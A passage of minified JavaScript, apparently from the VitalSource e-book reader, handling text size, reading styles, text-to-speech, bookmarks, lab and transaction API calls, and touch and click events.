                        textSize: (VST.textSize = r).toString()
                    })
                }
            },
            decreaseTextSize: function(e, t) {
                if (VST.Book.isPBK())
                    return e(zoomPDF("decrease"));
                var n = A._getDocumentHTML(),
                    o = .5;
                VST.Book.isPBK() && (o = 1);
                var i = VST.textSize || "1.00",
                    r = parseFloat(i);
                if (2 < (r -= .25) && (r -= .25), r = r.toString(), parseFloat(r) < o)
                    t({
                        message: "text limit reached",
                        textSize: r.toString()
                    });
                else {
                    var a = 100 * r + "%";
                    n.css("font-size", a),
                    parseFloat(r) == o ? e({
                        message: "text limit reached",
                        textSize: (VST.textSize = r).toString()
                    }) : e({
                        message: "success",
                        textSize: (VST.textSize = r).toString()
                    })
                }
            },
            getTextSize: function(e) {
                e({
                    message: "text limit reached",
                    textSize: VST.textSize.toString() || "1"
                })
            },
            setTextSize: function(e, t, n) {
                var o = f(VST.document).find("html"),
                    i = .5,
                    r = 4,
                    a = parseFloat(e);
                if (a < i || r < a)
                    n("cannot exceed text size limit");
                else {
                    var s = 100 * a + "%";
                    o.css("font-size", s),
                    t({
                        message: "text limit reached",
                        textSize: (VST.textSize = a).toString()
                    })
                }
            },
            addEnhancedFormattingCSS: function() {
                for (var e = 0; e < VST.documents.length; e++) {
                    var t = VST.documents[e],
                        n = [],
                        o = t.getElementById(E(e)),
                        i = t.getElementById(I(e)),
                        r = t.getElementById(N(e));
                    o || n.push({
                        append: !1,
                        href: "/assets/enhanced-formatting/ReadiumCSS-before-d72cbf5e9a736cc4f3348d5a0478938a51566aa954db7e7292c511428506b744.css",
                        id: E(e)
                    }),
                    i || n.push({
                        append: !0,
                        href: "/assets/enhanced-formatting/ReadiumCSS-after-2cac1d5a1be67bcde5f9833adf2e3135905dfda9b85a8ced6f904491601ce6c4.css",
                        id: I(e)
                    }),
                    r || n.push({
                        append: !0,
                        href: "/assets/open-dyslexic-2a970d3d0db90a41249b0e0e42b2d4a6b6d968df66b032e1633a5f7b5ce0b183.css",
                        id: N(e)
                    });
                    for (var a = t.head, s = 0; s < n.length; s++) {
                        var l = n[s],
                            c = t.createElement("link");
                        c.rel = "stylesheet",
                        c.type = "text/css",
                        c.href = l.href,
                        c.id = l.id,
                        l.append ? a.append(c) : a.prepend(c)
                    }
                }
            },
            removeEnhancedFormattingCSS: function() {
                P()
            },
            setFontFamily: function(e) {
                for (var t = 0; t < VST.documents.length; t++) {
                    var n = VST.documents[t].documentElement;
                    "default" === e ? n.style.setProperty("--USER__fontOverride", "readium-font-off") : (n.style.setProperty("--USER__fontOverride", "readium-font-on"), n.style.setProperty("--USER__fontFamily", "var(" + e + ")"))
                }
            },
            setDisplayMode: function(e) {
                for (var t = 0; t < VST.documents.length; t++)
                    VST.documents[t].documentElement.style.setProperty("--USER__appearance", "readium-" + e + "-on")
            },
            setPageMargin: function(e) {
                if (1 < VST.documents.length)
                    for (var t = 0; t < VST.documents.length; t++)
                        VST.documents[t].documentElement.style.setProperty("--USER__pageMargins", 0);
                else
                    VST.document.documentElement.style.setProperty("--USER__pageMargins", e)
            },
            setLineHeight: function(e) {
                for (var t = 0; t < VST.documents.length; t++)
                    "" === e || e === undefined ? VST.documents[t].documentElement.style.removeProperty("--USER__lineHeight") : VST.documents[t].documentElement.style.setProperty("--USER__lineHeight", e)
            },
            cleanupBeforeDestroy: function(e) {
                VST.BatchedPageViewLogger && (VST.BatchedPageViewLogger.flushSyncAndStop(), e())
            },
            enableLab: function(e, t, n) {
                f.ajax({
                    url: "/user/labs/-id-/enable".replace("-id-", e),
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            disableLab: function(e, t, n) {
                f.ajax({
                    url: "/user/labs/-id-/disable".replace("-id-", e),
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            likeLab: function(e, t, n) {
                f.ajax({
                    url: "/user/labs/-id-/like".replace("-id-", e),
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            dislikeLab: function(e, t, n) {
                f.ajax({
                    url: "/user/labs/-id-/dislike".replace("-id-", e),
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getLabInfo: function(e, t, n) {
                f.ajax({
                    url: "/labs/-id-".replace("-id-", e),
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getAllLabInfos: function(e, t) {
                f.ajax({
                    url: "/labs",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getAllTransactions: function(e, t) {
                f.ajax({
                    url: "/user/transactions",
                    type: "GET",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getTransaction: function(e, t, n) {
                f.ajax({
                    url: "/user/transactions/-id-".replace("-id-", e),
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getBrandConfig: function(e, t, n) {
                f.ajax({
                    url: "/brands/-id-".replace("-id-", e),
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            requestRefund: function(e, t, n) {
                f.ajax({
                    url: "/user/transactions/-id-/refund".replace("-id-", e.transactionId),
                    data: {
                        refund: i(e)
                    },
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            setupSecureToken: function(e) {
                this.secureToken = e,
                t["x-vitalsource-secure-token"] = e,
                f.ajaxSetup({
                    headers: t
                })
            },
            resendActivationEmail: function(e, t, n) {
                f.ajax({
                    url: "/user/activation",
                    data: e,
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            oneNote: function(e, t, n) {
                f.ajax({
                    url: "/user/one-note",
                    data: i(e),
                    type: "POST",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            setAutofocus: function(e, t) {
                VST.autofocus = e,
                t(!0)
            },
            setDPS: function(e, t) {
                VST.dpsOn = e,
                Jigsaw.reloadPage(function() {
                    t && t()
                })
            },
            tts: function(e, t) {
                var n = VST.TTS.sendStatus = function() {
                    VST.fire("tts:status", {
                        speaking: window.speechSynthesis.speaking,
                        paused: window.speechSynthesis.paused,
                        pending: window.speechSynthesis.pending
                    })
                };
                switch (e.action) {
                case "start":
                    VST.TTS.startAtTop();
                    break;
                case "cancel":
                    VST.TTS.cancel();
                    break;
                case "pause":
                    VST.TTS.pause();
                    break;
                case "resume":
                    VST.TTS.resume();
                    break;
                case "next":
                    VST.TTS.next();
                    break;
                case "prev":
                    VST.TTS.prev();
                    break;
                case "setVolume":
                    VST.TTS.setVolume(e.value);
                    break;
                case "setVoice":
                    VST.TTS.setVoice(e.value);
                    break;
                case "setRate":
                    VST.TTS.setRate(e.value);
                    break;
                case "setPitch":
                    VST.TTS.setPitch(e.value);
                    break;
                case "setLang":
                    VST.TTS.setLang(e.value)
                }
                setTimeout(n, 250),
                t()
            },
            ttsv2: function(e, t) {
                var n = VST.TTSV2.Main;
                switch (e.action) {
                case "getTextChunks":
                    t(n.getTextChunks(e.options));
                    break;
                case "highlight":
                    n.highlight(e.index),
                    t();
                    break;
                case "unhighlight":
                    n.unhighlight(),
                    t();
                    break;
                case "updateStatus":
                    n.updateStatus(e.status),
                    t()
                }
            },
            disableScrolling: function(e) {
                VST.pageScrollDisabled = !0,
                C(),
                e()
            },
            enableScrolling: function(e) {
                VST.pageScrollDisabled = !1,
                C(),
                e()
            },
            fireCallback: function() {
                VST.Utils.fireCallback.apply(VST.Utils, arguments)
            },
            enableImageButtons: function() {
                VST.ImageButtons.enable()
            },
            disableImageButtons: function() {
                VST.ImageButtons.disable()
            }
        }, _ = ["ready", "fire", "zoomDisabled", "swipeDisabled", "highlightsEnabled", "noteIcon", "getImageButtonConfig", "topURL", "getContentRange", "enter"], B = _.length - 1; 0 <= B; B--)
        Jigsaw.socketMethods.remote[_[B]] = {};
    Jigsaw.addLocalSocketMethods(A),
    Jigsaw.socket = new easyXDM.Rpc(Jigsaw.socketOptions, Jigsaw.socketMethods)
}.call(this, VST.$),
function(t) {
    var n = function(e) {
            VST.trigger("user:signout", t.parseJSON(e.responseText))
        },
        e = function() {};
    e.prototype.mark = function(e) {
        VST.Book && e && e.page && (d = {
            page: e.page
        }, t.ajax({
            url: VST.Book.buildAPIURL("/logs/bookmark"),
            type: "POST",
            data: {
                log: d,
                insecure: e.insecure
            },
            dataType: "json",
            statusCode: {
                401: n
            }
        }))
    },
    VST.Bookmarker = new e,
    VST.bind("page:load", function(e, t) {
        0 < VST.$(VST.document).find('[src^="http:"],link[href^="http:"]').length && (t.insecure = !0),
        VST.Bookmarker.mark(t)
    })
}.call(this, VST.$),
function() {
    function f(e) {
        return 0 < e.closest("." + VST.Models.Highlight.Settings.highlightClass).length
    }
    function h(e) {
        var t = ["button", "slider", "radio"];
        return !!e && (0 <= ["a", "button", "input", "textarea", "select", "area", "label"].indexOf(e.nodeName.toLowerCase()) || (!!(e.getAttribute && 0 <= t.indexOf(e.getAttribute("role"))) || h(e.parentNode)))
    }
    var a = function() {
        return {}
    };
    VST.bind("page:ready", function() {
        for (var e = 0; e < (VST.documents || []).length; e++)
            for (var t = VST.$(VST.documents[e]), n = ["click", "focusin", "keyup", "keydown", "keypress", "mousedown", "touchstart", "touchend", "touchmove"], o = n.length - 1; 0 <= o; o--)
                !function(d) {
                    "click" == d && "ontouchstart" in window || (jigName = d + ".jigsaw", t.off(jigName).on(jigName, function(e) {
                        if ("click" === d) {
                            for (var t = e.target; "g" === t.nodeName.toLowerCase() || "path" === t.nodeName.toLowerCase() || "svg" === t.nodeName.toLowerCase();)
                                t = t.parentNode;
                            var n = VST.$(t);
                            if (f(n))
                                return;
                            for (var o = e.target; o;) {
                                if (h(o))
                                    return;
                                if (1 !== o.nodeType)
                                    break;
                                o = o.parentNode
                            }
                            if (n.hasClass("vst-click"))
                                return;
                            if (e.isDefaultPrevented() || e.isImmediatePropagationStopped() || e.isPropagationStopped())
                                return;
                            if ("" !== VST.Utils.getSelectedText())
                                return
                        }
                        if (0 <= ["mousedown", "focusin", "touchstart"].indexOf(d))
                            for (var i = 0; i < (VST.documents || []).length; i++) {
                                var r = VST.documents[i];
                                if (r !== e.target.ownerDocument) {
                                    var a = r.getSelection();
                                    a && a.removeAllRanges()
                                } else
                                    VST.document = r,
                                    VST.window = VST.windows[i]
                            }
                        if (/^key/.test(d))
                            VST.trigger("book:" + d, {
                                keyCode: e.which
                            });
                        else {
                            var s = e.originalEvent.touches && 0 < e.originalEvent.touches.length ? e.originalEvent.touches[0] : e,
                                l = (o = e.target, VST.Utils.scrollTop()),
                                c = VST.Utils.scrollLeft(),
                                u = VST.sharedEpubModule.GetCFIForNode(o);
                            VST.trigger("book:" + d, {
                                x: s.clientX,
                                y: s.clientY,
                                cfi: u,
                                nodeRect: {
                                    top: o.offsetTop - l,
                                    left: o.offsetLeft - c,
                                    right: o.offsetLeft - c + o.offsetWidth,
                                    bottom: o.offsetTop - l + o.offsetHeight,
                                    width: o.offsetWidth,
                                    height: o.offsetHeight
                                }
                            })
                        }
                    }))
                }(n[o]),
                VST.$(t.get(0).defaultView).on("mousewheel DOMMouseScroll wheel", function(e) {
                    VST.trigger("book:mousewheel", {
                        delta: e.originalEvent.deltaY
                    })
                }),
                t.on("mousemove", function() {
                    VST.throttle("book:mousemove", +new Date, 50)
                })
    }),
    VST.bind("page:ready", function() {
        var r;
        VST.$(VST.document).on("touchstart", function(e) {
            var t = e.originalEvent.changedTouches && 0 < e.originalEvent.changedTouches.length ? e.originalEvent.changedTouches[0] : e.originalEvent;
            r || (r = {
                event: e,
                pageX: t.pageX,
                pageY: t.pageY,
                timeStamp: e.timeStamp
            })
        }).on("touchend", function(e) {
            var t = VST.$(e.target);
            if (f(t))
                r = null;
            else {
                var n = e.originalEvent.changedTouches && 0 < e.originalEvent.changedTouches.length ? e.originalEvent.changedTouches[e.originalEvent.changedTouches.length - 1] : e.originalEvent;
                if (e.timeStamp - r.timeStamp < 175) {
                    var o = Math.abs(n.pageX - r.pageX),
                        i = Math.abs(n.pageY - r.pageY);
                    if (Math.sqrt(o * o + i * i) < 7 && !t.hasClass("vst-click")) {
                        if (h(e.target))
                            return;
                        VST.trigger("book:click", a(e))
                    }
                }
                r = null
            }
        })
    })
}.call(this),
function(e) {
    e.FeatureChecks = {
        hasAutoExpandingIframe: function() {
            if (Browser.isIOS()) {
                var e = Browser.getIOSVersion();
                return void 0 !== e && e < 13
            }
            return !1
        }
    }
}.call(this, VST);

